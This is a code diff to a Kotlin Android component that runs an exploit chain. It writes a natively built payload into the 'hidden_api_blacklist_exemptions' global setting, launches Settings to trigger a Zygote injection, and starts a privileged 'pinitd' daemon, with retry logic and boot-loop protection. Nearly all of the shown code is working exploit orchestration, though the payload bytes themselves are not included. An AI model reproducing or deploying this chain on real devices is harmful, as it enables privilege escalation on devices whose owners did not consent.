@@ -11,63 +11,76 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import kotlin.time.Duration.Companion.milliseconds
 
 val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")
 
-fun launchWithBootProtection(context: Context) {
-    Log.w(SHARED_TAG, "Boot completed. Delaying to wait for Android to stabilize")
+private const val MAX_EXPLOIT_ATTEMPTS = 3
+private const val BOOT_STABILIZE_DELAY_MS = 10000L
+private const val EXPECTED_EXPLOIT_CRASH_DELAY_MS = 20000L
 
-    Thread.sleep(10000)
+fun launchWithBootProtection(context: Context) {
+    Log.w(SHARED_TAG, "Boot completed. Delaying ${BOOT_STABILIZE_DELAY_MS}ms to wait for Android to stabilize")
+
+    Thread.sleep(BOOT_STABILIZE_DELAY_MS)
 
     Log.w(SHARED_TAG, "Delay completed. Checking boot protection")
 
-    // TODO: Check if exemption is already set. If so, this boot may be broken, so we need to clear and reboot before starting
-    // Make sure to count this as a boot failure
+    val existingExemption = Settings.Global.getString(context.contentResolver, "hidden_api_blacklist_exemptions")
+    if (!existingExemption.isNullOrEmpty()) {
+        Log.e(SHARED_TAG, "hidden_api_blacklist_exemptions already set (length ${existingExemption.length}). Clearing")
+    }
 
-    // Attempt to make absolutely sure the exploit is cleared. This will ideally prevent
-    // boot looping since this runs so early
     context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)
 
     val protection = BootLoopProtection(context)
-    protection.recordAttempt()
     val launchStatus = protection.shouldAttemptLaunch()
 
-    if (launchStatus == BootProtectionStatus.REQUIRES_BOOT) {
-        Log.w(SHARED_TAG, "Boot protection allows launch, proceeding")
+    when (launchStatus) {
+        BootProtectionStatus.ALREADY_BOOTED -> {}
+        BootProtectionStatus.REQUIRES_BOOT -> {
+            protection.recordAttempt()
 
-        val scope = CoroutineScope(Dispatchers.IO)
-        scope.launch {
-            launchPinitd(scope, context, protection)
+            val scope = CoroutineScope(Dispatchers.IO)
+            scope.launch {
+                // I don't think it's possible to retry as a failure will likely have launched Settings, which we cannot quit,
+                // but we can try anyway
+                for (attempt in 1..MAX_EXPLOIT_ATTEMPTS) {
+                    Log.w(SHARED_TAG, "Exploit attempt $attempt/$MAX_EXPLOIT_ATTEMPTS")
 
-            // TODO: Kill process after delay (to keep `ps` clean)
-            Thread.sleep(200)
+                    launchPinitd(scope, context, protection)
 
-            if (!protection.checkForPinitd()) {
-                Log.e(SHARED_TAG, "pinitd failed to start. Vulnerability failed")
+                    // The fcntl lock is dropped during daemonize (double-fork), so we can't
+                    // use it to verify success. Wait for the expected system restart instead.
+                    delay(EXPECTED_EXPLOIT_CRASH_DELAY_MS)
+
+                    Log.e(SHARED_TAG, "Still alive after attempt $attempt")
+
+                    if (attempt < MAX_EXPLOIT_ATTEMPTS) {
+                        forceClearVulnerability(context)
+                    }
+                }
+
+                Log.e(SHARED_TAG, "pinitd failed to start after $MAX_EXPLOIT_ATTEMPTS attempts")
                 protection.playDeathChime()
-
-                forceClearVulnerability(context)
             }
         }
-    } else if (launchStatus == BootProtectionStatus.DISABLED_BOOT) {
-        Log.w(SHARED_TAG, "Boot protection blocked launch")
-        Log.i(SHARED_TAG, protection.getStatus())
-        protection.playDeathChime()
+        BootProtectionStatus.DISABLED_BOOT -> {
+            Log.w(SHARED_TAG, "Boot protection blocked launch")
+            Log.i(SHARED_TAG, protection.getStatus())
+            protection.playDeathChime()
+        }
     }
 }
 
 suspend fun launchPinitd(scope: CoroutineScope, context: Context, protection: BootLoopProtection) {
-    // Path will end with "base.apk". Remove that and navigate to native library
     val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
     val binaryPath = basePath + "lib/arm64/libpinitd.so"
-    Log.w(SHARED_TAG, "Attempting to launch: $binaryPath")
     try {
-        // Spawn logcat monitor
         val logcat = Logcat(scope)
-        // Make sure logcat is as up to date as possible when we start waiting on it
         logcat.eatInBackground()
 
         val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))
@@ -80,38 +93,33 @@ suspend fun launchPinitd(scope: CoroutineScope, context: Context, protection: Bo
         val settingsIntent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
         settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
 
-        Log.w(SHARED_TAG, "Setting payload: $payload")
+        if (settingsIntent == null) {
+            Log.e(SHARED_TAG, "Could not get Settings launch intent. Aborting exploit")
+            return
+        }
+
         Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)
 
-        Log.w(SHARED_TAG, "Payload set")
         startApp("Settings", context, settingsIntent)
 
-        if (logcat.waitForSubstring("com.android.settings/1000 for top-activity", 1000.milliseconds)) {
-            Log.w(SHARED_TAG, "Received settings launch log. Sending exemptions clear")
-        } else {
-            Log.w(SHARED_TAG, "Didn't receive settings launch log. Sending exemptions clear anyway")
+        val foundLog = logcat.waitForSubstring("com.android.settings/1000 for top-activity", 2000.milliseconds)
+
+        if (!foundLog) {
+            Log.w(SHARED_TAG, "Settings launch log not received within timeout")
         }
 
         scope.launch {
             forceClearVulnerability(context)
         }
-
-        Log.w(SHARED_TAG, "Trampoline complete")
     } catch (e: Exception) {
-        // Failure already recorded
         Log.e(SHARED_TAG, "Exploit error: ${e.message}")
+        e.printStackTrace()
     }
 }
 
-fun startApp(name: String, context: Context, intent: Intent?) {
+fun startApp(name: String, context: Context, intent: Intent) {
     try {
-        if (intent != null) {
-            Log.w(SHARED_TAG, "Starting $name")
-            context.startActivity(intent)
-            Log.w(SHARED_TAG, "Intent sent for $name")
-        } else {
-            Log.e(SHARED_TAG, "Zygote trigger app not found")
-        }
+        context.startActivity(intent)
     } catch (e: Exception) {
         Log.e(SHARED_TAG, "Zygote trigger app launch error: ${e.message}")
     }
